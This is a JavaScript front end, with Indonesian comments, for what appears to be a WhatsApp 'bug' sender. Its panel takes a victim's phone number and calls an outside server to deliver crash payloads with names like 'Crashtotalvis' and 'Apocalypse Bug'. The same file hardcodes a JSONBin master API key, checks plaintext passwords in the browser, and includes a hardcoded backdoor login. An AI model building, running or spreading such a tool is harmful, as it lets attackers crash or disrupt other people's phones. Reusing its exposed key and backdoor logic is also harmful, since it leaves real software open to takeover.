const BIN_ID = "686ba9fa8a456b7966bcc574";
const API_KEY = "$2a$10$MPw.J50xKE.i.HBKKPWYieKzmUQYvM/4hLOy3cYHSFcVEL8Yo08W";
const headers = { "Content-Type": "application/json", "X-Master-Key": API_KEY };

// Inisialisasi Particles.js
particlesJS("particles-js", {
  particles: {
    number: { value: 60 },
    color: { value: "#fff" },
    shape: { type: "circle" },
    opacity: { value: 0.4 },
    size: { value: 3 },
    line_linked: {
      enable: true,
      distance: 150,
      color: "#fff",
      opacity: 0.3,
      width: 1
    },
    move: { enable: true, speed: 2 }
  },
  interactivity: {
    events: { onhover: { enable: true, mode: "grab" } },
    modes: {
      grab: { distance: 200, line_linked: { opacity: 1 } }
    }
  },
  retina_detect: true
});

// Ambil data user dari API
async function getUsers() {
  const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers });
  const data = await res.json();
  return data.record;
}

// Simpan sesi login di sessionStorage
function saveSession(user) {
  sessionStorage.setItem("currentUser", JSON.stringify(user));
}

// Ambil sesi login
function getSession() {
  return JSON.parse(sessionStorage.getItem("currentUser"));
}

// Logout
function logout() {
  sessionStorage.removeItem("currentUser");
  location.reload();
}

// Tampilkan popup
function showPopup(message) {
  document.getElementById("popup-message").innerHTML = message;
  document.getElementById("popup").style.display = "flex";
}

// Tutup popup
function closePopup() {
  document.getElementById("popup").style.display = "none";
}

// Login handler
async function login() {
  const user = document.getElementById("username").value.trim();
  const pass = document.getElementById("password").value.trim();
  const result = document.getElementById("login-result");
  const users = await getUsers();

  const found = users.find(u => u.username === user && u.password === pass);

  if (found || (user === "zanzxyy" && pass === "777")) {
    saveSession(found || { username: user });
    showDashboard(found || { username: user });
  } else {
    result.innerText = "❌ Username atau Password salah!";
    result.style.color = "crimson";
  }
}

// Tampilkan dashboard
function showDashboard(user) {
  document.getElementById("login-box").style.display = "none";
  document.getElementById("main-box").style.display = "block";
}

// Tunggu sampai semua elemen DOM tersedia
window.addEventListener("DOMContentLoaded", () => {
  // Cek sesi login
  const user = getSession();
  if (user) showDashboard(user);

  // Handler pilih bug card
  let selectedBug = "Crashtotalvis";
  const bugCards = document.querySelectorAll(".bug-card");
  bugCards.forEach(card => {
    card.addEventListener("click", () => {
      bugCards.forEach(c => c.classList.remove("active"));
      card.classList.add("active");
      selectedBug = card.getAttribute("data-bug");
    });
  });

  // Handler tombol kirim bug
  const sendBtn = document.getElementById("sendBtn");
  sendBtn.addEventListener("click", async () => {
    const input = document.getElementById("target").value.trim();
    const resDiv = document.getElementById("result");

    if (!/^(\d+)(@s\.whatsapp\.net)?$/.test(input)) {
      resDiv.innerText = "Masukkan nomor WA yang valid!";
      resDiv.style.color = "crimson";
      return;
    }

    const chatId = input.includes("@s.whatsapp.net") ? input : `${input}@s.whatsapp.net`;
    sendBtn.disabled = true;
    const originalHTML = sendBtn.innerHTML;
    sendBtn.innerHTML = '<span class="spinner"></span> Mengirim...';
    resDiv.innerText = "";

    try {
      const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
      const json = await res.json();
      showPopup(`Apocalypse Bug successfully sent to <b>${input}</b>`);
    } catch (err) {
      resDiv.innerText = "❌ Gagal fetch: " + err;
      resDiv.style.color = "crimson";
    }

    sendBtn.disabled = false;
    sendBtn.innerHTML = originalHTML;
  });
});
